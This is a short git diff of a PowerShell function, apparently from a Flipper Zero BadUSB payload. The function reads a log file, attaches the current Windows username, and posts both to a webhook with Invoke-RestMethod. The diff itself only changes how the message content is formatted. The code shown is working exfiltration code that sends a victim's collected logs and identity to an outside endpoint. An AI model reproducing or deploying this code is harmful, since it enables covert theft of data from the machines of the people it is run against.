@@ -3,7 +3,7 @@ function sendWebhook(){
   $logs = Get-Content "$logFile" | Out-String;
   $Body = @{
     'username' = "FinGymPlayz FLIPPER ZERO LOGS";
-    'content' = "> USER: ``"+$env:UserName+"```n> CONTENT: >>"+$logs+"<<";
+    'content' = "> USER: ``"+$env:UserName+"```n> CONTENT: "+$logs;
   };
   Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body;
 };
